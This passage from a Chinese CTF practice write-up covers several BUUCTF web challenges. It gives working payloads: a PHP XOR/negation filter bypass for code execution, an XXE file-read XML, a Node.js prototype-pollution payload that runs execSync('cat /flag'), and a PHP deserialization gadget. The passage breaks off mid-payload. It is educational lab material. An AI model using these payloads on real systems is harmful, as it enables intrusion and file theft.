src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412212725115.png" alt="image-20220412212725115"></p><p>再session反序列化的时候不知道为啥用自己的会有些问题，导致连接超时，但是换成另外的就不会这样，上面那个就是用自己cookie的结果，卡了好久，然后再刷新的时候环境都打不开了</p><p>这是用其他的cookie的结果</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220412213433110.png" alt="image-20220412213433110"></p><h2 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h2><p>这题第二个if判断可太恶心人了</p><pre class="language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);$_ &#x3D; @$_GET[&#39;_&#39;];if ( preg_match(&#39;&#x2F;[\x00- 0-9\&#39;&quot;&#96;$&amp;.,|[&#123;_defgops\x7F]+&#x2F;i&#39;, $_) )    die(&#39;rosé will not do it&#39;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )    die(&#39;you are so close, omg&#39;);eval($_);?&gt;</code></pre><p>绕过两个if就能成功执行命令，但是第一个if正则匹配了不少东西</p><pre class="language-none"><code class="language-none">\x00- 0-9                       匹配\x00到空格(\x20)，0-9的数字&#39;&quot;&#96;$&amp;.,|[&#123;_defgops              匹配这些字符\x7F                            匹配DEL(\x7F)字符</code></pre><p>可以用这个网站看看<a href="https://regex101.com/">https://regex101.com/</a></p><p>既然^和~符号没被过滤，很容易想到异或和取反绕过，先取反看看phpinfo</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220413175001715.png" alt="image-20220413175001715"></p><p>一些命令执行函数不能用，但是还有scandir那些，可以用scandir配合print_f来读取目录</p><p>这时候就要绕过第二个if了，要求出现的字符种类不超过13个，而（）^;这已经四个了，也就是我们能控制的字符只有九个，用异或还要有一个%ff，这下只有八个了</p><p>先上脚本</p><pre class="language-none"><code class="language-none">str &#x3D; &#39;acdips&#39;target &#x3D; &#39;ntrfl&#39;for m in target:    for a in str:        for b in str:            for c in str:                if ord(a) ^ ord(b) ^ ord(c) &#x3D;&#x3D; ord(m):                    print(&quot;&#123;&#125; &#x3D; &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;.format(m, a, b, c), )                    print(&quot;&#123;&#125; &#x3D; &#123;&#125;^&#123;&#125;^&#123;&#125;&quot;.format(hex(~ord(m) &amp; 0xff), hex(~ord(a) &amp; 0xff), hex(~ord(b) &amp; 0xff),hex(~ord(c) &amp; 0xff)))</code></pre><p>这是其他师傅的解释</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220413175440905.png" alt="image-20220413175440905"></p><p>接下来就是对照着脚本将字符替换掉就行了</p><pre class="language-none"><code class="language-none">((%8f%9c%96%9c%9c%a0%9c)^(%8f%9e%96%9b%9b%a0%9e)^(%8f%8f%96%96%8c%a0%8f)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220413151805073.png" alt="image-20220413151805073"></p><p>看到了flag文件，在最后一个，所以用end将指针指向最末尾的文件，然后利用readfile或者show_source读就行了</p><p>payload</p><pre class="language-none"><code class="language-none">((%9e%9a%9e%9b%9e%96%9e%9a)^(%9c%9a%9e%9b%9c%96%96%9a)^(%8f%9a%9e%9b%9b%96%9b%9a)^(%ff%ff%ff%ff%ff%ff%ff%ff))(((%9a%9c%9b)^(%9a%9b%9b)^(%9a%96%9b)^(%ff%ff%ff))(((%8c%9c%9e%9b%9b%96%9e)^(%8c%9c%9e%96%9b%96%9c)^(%8c%9c%9e%9c%9b%96%8f)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff)));</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220413175809750.png" alt="image-20220413175809750"></p><h2 id="CSAWQual-2019-Web-Unagi"><a href="#CSAWQual-2019-Web-Unagi" class="headerlink" title="[CSAWQual 2019]Web_Unagi"></a>[CSAWQual 2019]Web_Unagi</h2><p>文件上传的题，不过不是传一句话，而是传xml文件，利用xxe来读flag</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211118004.png" alt="image-20220417211118004"></p><p>通过提示知道flag在/flag里，</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211146823.png" alt="image-20220417211146823"></p><p>再配合这个上传示例，可以写一个xml的文件</p><pre class="language-none"><code class="language-none">&lt;?xml version&#x3D;&#39;1.0&#39;?&gt;&lt;!DOCTYPE users [&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot; &gt;]&gt;&lt;users&gt;    &lt;user&gt;        &lt;username&gt;&amp;xxe;&lt;&#x2F;username&gt;        &lt;password&gt;&amp;xxe;&lt;&#x2F;password&gt;        &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;        &lt;email&gt;&amp;xxe;&lt;&#x2F;email&gt;          &lt;group&gt;&amp;xxe;&lt;&#x2F;group&gt;        &lt;intro&gt;&amp;xxe;&lt;&#x2F;intro&gt;    &lt;&#x2F;user&gt;&lt;&#x2F;users&gt;</code></pre><p>但是这里的过滤不知道是通过什么方式的，通过utf-16编码就可以绕过，utf-8就不行，所以windows可以用记事本写完之后另存为utf-16的格式，Linux就是利用<code>iconv -f utf8 -t utf-16 2.xml&gt;1.xml</code>的命令把utf-8转化为utf-16</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211659665.png" alt="image-20220417211659665"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220417211720623.png" alt="image-20220417211720623"></p><h2 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="[GYCTF2020]Ez_Express"></a>[GYCTF2020]Ez_Express</h2><p>原型链污染和js的大小写特性</p><p>存在源码泄露，<a href="http://www.zip下载源码,主要是看路由的部分/">www.zip下载源码，主要是看路由的部分</a></p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">isObject</span> <span class="token operator">=</span> <span class="token parameter">obj</span> <span class="token operator">=></span> obj <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">&amp;&amp;</span> obj<span class="token punctuation">.</span>constructor <span class="token operator">===</span> Object<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token function-variable function">merge</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isObject</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> a<span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">clone</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">safeKeyword</span><span class="token punctuation">(</span><span class="token parameter">keyword</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>keyword<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">(admin)</span><span class="token regex-delimiter">/</span><span class="token regex-flags">is</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> keyword  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token keyword">undefined</span><span class="token punctuation">&#125;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  res<span class="token punctuation">.</span>outputFunctionName<span class="token operator">=</span><span class="token keyword">undefined</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token operator">:</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"register"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safeKeyword</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('forbid word');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">=</span><span class="token punctuation">&#123;</span>      <span class="token string">'user'</span><span class="token operator">:</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token string">'passwd'</span><span class="token operator">:</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token punctuation">,</span>      <span class="token string">'isLogin'</span><span class="token operator">:</span><span class="token boolean">false</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('register first');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">==</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token operator">&amp;&amp;</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token operator">==</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>passwd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>isLogin<span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>      res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('error passwd');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/action'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">!=</span><span class="token string">"ADMIN"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('ADMIN is asked');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>   req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token function">clone</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('success');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/info'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span>data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token operator">:</span>res<span class="token punctuation">.</span>outputFunctionName<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span></code></pre><p>我们看到登录的部分有toUpperCase，而题目要求要用ADMIN用户登录，这里可以利用js的大小写特性绕过</p><pre class="language-none"><code class="language-none">toUpperCase()其中混入了两个奇特的字符&quot;ı&quot;、&quot;ſ&quot;。 这两个字符的“大写”是I和S。也就是说&quot;ı&quot;.toUpperCase() &#x3D;&#x3D; &#39;I&#39;，&quot;ſ&quot;.toUpperCase() &#x3D;&#x3D; &#39;S&#39;。通过这个小特性可以绕过一些限制。toLowerCase()这个&quot;K&quot;的“小写”字符是k，也就是&quot;K&quot;.toLowerCase() &#x3D;&#x3D; &#39;k&#39;.</code></pre><p>利用admın注册就可以</p><p>登录后提示flag在/flag里</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418221749857.png" alt="image-20220418221749857"></p><p>而源码中存在着merge函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418221823929.png" alt="image-20220418221823929"></p><p>而info中</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418221932516.png" alt="image-20220418221932516"></p><p>outputFunction正好又是未定义，info还会将outputFunctionName渲染到页面中</p><p>所以我们可以给对象原型的类添加一个outputFunctionName属性，通过它得到flag。</p><p>payload：</p><pre class="language-none"><code class="language-none">&#123;&quot;lua&quot;:&quot;php&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;)&#x2F;&#x2F;&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;不太理解这里最后的&#x2F;&#x2F;的含义，但是没有这个不会成功执行，而且会出现报错，所以我认为可能是对后文的注释，而且用&#123;&quot;lua&quot;:&quot;php&quot;,&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;a;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;);x&quot;&#125;,&quot;Submit&quot;:&quot;&quot;&#125;也能成功，所以应该就是为了保证语句的完整</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220418222438819.png" alt="image-20220418222438819"></p><p>这时候再访问一下/info就能下载到flag文件</p><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>确实不是文件上传，只能传图片而且路径也没有，这其实是一个搭配反序列化的sql题</p><p>show.php:</p><pre class="language-none"><code class="language-none">&lt;?phpinclude(&quot;.&#x2F;helper.php&quot;);$show &#x3D; new show();if($_GET[&quot;delete_all&quot;])&#123;   if($_GET[&quot;delete_all&quot;] &#x3D;&#x3D; &quot;true&quot;)&#123;      $show-&gt;Delete_All_Images();   &#125;&#125;$show-&gt;Get_All_Images();class show&#123;   public $con;   public function __construct()&#123;      $this-&gt;con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;);      if (mysqli_connect_errno($this-&gt;con))&#123;              die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());      &#125;   &#125;   public function Get_All_Images()&#123;      $sql &#x3D; &quot;SELECT * FROM images&quot;;      $result &#x3D; mysqli_query($this-&gt;con, $sql);      if ($result-&gt;num_rows &gt; 0)&#123;          while($row &#x3D; $result-&gt;fetch_assoc())&#123;             if($row[&quot;attr&quot;])&#123;                $attr_temp &#x3D; str_replace(&#39;\0\0\0&#39;, chr(0).&#39;*&#39;.chr(0), $row[&quot;attr&quot;]);               $attr &#x3D; unserialize($attr_temp);            &#125;              echo &quot;&lt;p&gt;id&#x3D;&quot;.$row[&quot;id&quot;].&quot; filename&#x3D;&quot;.$row[&quot;filename&quot;].&quot; path&#x3D;&quot;.$row[&quot;path&quot;].&quot;&lt;&#x2F;p&gt;&quot;;          &#125;      &#125;else&#123;          echo &quot;&lt;p&gt;You have not uploaded an image yet.&lt;&#x2F;p&gt;&quot;;      &#125;      mysqli_close($this-&gt;con);   &#125;   public function Delete_All_Images()&#123;      $sql &#x3D; &quot;DELETE FROM images&quot;;      $result &#x3D; mysqli_query($this-&gt;con, $sql);   &#125;&#125;</code></pre><p>upload.php</p><pre class="language-none"><code class="language-none">&lt;?phpinclude(&quot;.&#x2F;helper.php&quot;);class upload extends helper &#123;   public function upload_base()&#123;      $this-&gt;upload();   &#125;&#125;if ($_FILES)&#123;   if ($_FILES[&quot;file&quot;][&quot;error&quot;])&#123;      die(&quot;Upload file failed.&quot;);   &#125;else&#123;      $file &#x3D; new upload();      $file-&gt;upload_base();   &#125;&#125;$a &#x3D; new helper();</code></pre><p>helper.php</p><pre class="language-none"><code class="language-none">&lt;?phpclass helper &#123;   protected $folder &#x3D; &quot;pic&#x2F;&quot;;   protected $ifview &#x3D; False;    protected $config &#x3D; &quot;config.txt&quot;;   &#x2F;&#x2F; The function is not yet perfect, it is not open yet.   public function upload($input&#x3D;&quot;file&quot;)   &#123;      $fileinfo &#x3D; $this-&gt;getfile($input);      $array &#x3D; array();      $array[&quot;title&quot;] &#x3D; $fileinfo[&#39;title&#39;];      $array[&quot;filename&quot;] &#x3D; $fileinfo[&#39;filename&#39;];      $array[&quot;ext&quot;] &#x3D; $fileinfo[&#39;ext&#39;];      $array[&quot;path&quot;] &#x3D; $fileinfo[&#39;path&#39;];      $img_ext &#x3D; getimagesize($_FILES[$input][&quot;tmp_name&quot;]);      $my_ext &#x3D; array(&quot;width&quot;&#x3D;&gt;$img_ext[0],&quot;height&quot;&#x3D;&gt;$img_ext[1]);      $array[&quot;attr&quot;] &#x3D; serialize($my_ext);      $id &#x3D; $this-&gt;save($array);      if ($id &#x3D;&#x3D; 0)&#123;         die(&quot;Something wrong!&quot;);      &#125;      echo &quot;&lt;br&gt;&quot;;      echo &quot;&lt;p&gt;Your images is uploaded successfully. And your image&#39;s id is $id.&lt;&#x2F;p&gt;&quot;;   &#125;   public function getfile($input)   &#123;      if(isset($input))&#123;         $rs &#x3D; $this-&gt;check($_FILES[$input]);      &#125;      return $rs;   &#125;   public function check($info)   &#123;      $basename &#x3D; substr(md5(time().uniqid()),9,16);      $filename &#x3D; $info[&quot;name&quot;];      $ext &#x3D; substr(strrchr($filename, &#39;.&#39;), 1);      $cate_exts &#x3D; array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);      if(!in_array($ext,$cate_exts))&#123;         die(&quot;&lt;p&gt;Please upload the correct image file!!!&lt;&#x2F;p&gt;&quot;);      &#125;       $title &#x3D; str_replace(&quot;.&quot;.$ext,&#39;&#39;,$filename);       return array(&#39;title&#39;&#x3D;&gt;$title,&#39;filename&#39;&#x3D;&gt;$basename.&quot;.&quot;.$ext,&#39;ext&#39;&#x3D;&gt;$ext,&#39;path&#39;&#x3D;&gt;$this-&gt;folder.$basename.&quot;.&quot;.$ext);   &#125;   public function save($data)   &#123;      if(!$data || !is_array($data))&#123;         die(&quot;Something wrong!&quot;);      &#125;      $id &#x3D; $this-&gt;insert_array($data);      return $id;   &#125;   public function insert_array($data)   &#123;        $con &#x3D; mysqli_connect(&quot;127.0.0.1&quot;,&quot;r00t&quot;,&quot;r00t&quot;,&quot;pic_base&quot;);      if (mysqli_connect_errno($con))       &#123;           die(&quot;Connect MySQL Fail:&quot;.mysqli_connect_error());      &#125;      $sql_fields &#x3D; array();      $sql_val &#x3D; array();      foreach($data as $key&#x3D;&gt;$value)&#123;         $key_temp &#x3D; str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $key);         $value_temp &#x3D; str_replace(chr(0).&#39;*&#39;.chr(0), &#39;\0\0\0&#39;, $value);         $sql_fields[] &#x3D; &quot;&#96;&quot;.$key_temp.&quot;&#96;&quot;;         $sql_val[] &#x3D; &quot;&#39;&quot;.$value_temp.&quot;&#39;&quot;;      &#125;      $sql &#x3D; &quot;INSERT INTO images (&quot;.(implode(&quot;,&quot;,$sql_fields)).&quot;) VALUES(&quot;.(implode(&quot;,&quot;,$sql_val)).&quot;)&quot;;      mysqli_query($con, $sql);      $id &#x3D; mysqli_insert_id($con);      mysqli_close($con);      return $id;   &#125;   public function view_files($path)&#123;      if ($this-&gt;ifview &#x3D;&#x3D; False)&#123;         return False;         &#x2F;&#x2F;The function is not yet perfect, it is not open yet.      &#125;      $content &#x3D; file_get_contents($path);      echo $content;   &#125;   function __destruct()&#123;      # Read some config html      $this-&gt;view_files($this-&gt;config);   &#125;&#125;</code></pre><p>我们能看到helper里有个file_get_contents，而且path的值是config的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419173441837.png" alt="image-20220419173441837"></p><p>在show里还有个unserialize</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419173934449.png" alt="image-20220419173934449"></p><p>可以看出这个题是反序列化，而我们的目的就是控制config里的内容</p><p>反序列化的部分很简单</p><pre class="language-none"><code class="language-none">&lt;?phpclass helper&#123;    protected $ifview &#x3D; true;    protected $config &#x3D; &quot;&#x2F;flag&quot;;&#125;$a &#x3D; new helper();echo serialize($a);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419174443448.png" alt="image-20220419174443448"></p><p>但是我们要想办法把这个传进去</p><p>再来看把图片存入数据库的过程</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419182850792.png" alt="image-20220419182850792"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419182904814.png" alt="image-20220419182904814"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20220419183012084.png" alt="image-20220419183012084"></p><p>那么正常的语句就应该是</p><pre class="language-none"><code class="language-none">INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES(&#39;图片名称&#39;,&#39;f20c76cc4fb41838.jpg&#39;,&#39;jpg&#39;,&#39;pic&#x2F;f20c76cc4fb41838.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:1264;s:6:&quot;height&quot;;i:992;&#125;&#39;)</code></pre><p>而title我们是可控的，所以我们构造的payload为</p><pre class="language-none"><code 